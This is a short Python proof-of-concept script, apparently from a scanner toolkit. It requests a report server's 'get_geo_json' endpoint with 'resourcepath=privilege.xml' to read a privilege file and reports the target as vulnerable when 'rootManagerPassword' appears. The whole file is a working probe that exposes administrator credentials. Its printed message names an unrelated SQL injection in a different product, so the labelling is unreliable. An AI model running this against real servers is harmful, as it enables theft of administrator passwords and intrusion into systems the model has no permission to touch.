import httpx
from lib.get_normal_url import get_standard_url
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

def poc(target):
    try:
        target = get_standard_url(target)
        url1 = target + "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
        url2 = target +  "/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"

        res1 = httpx.get(url1,headers=headers)
        res2 = httpx.get(url2,headers=headers)

        if "rootManagerPassword" in res1.text or "rootManagerPassword" in res2.text:
            print("\033[0;31m 启莱OA CloseMsg.aspx SQL注入漏洞："+ target )
    except:
        pass


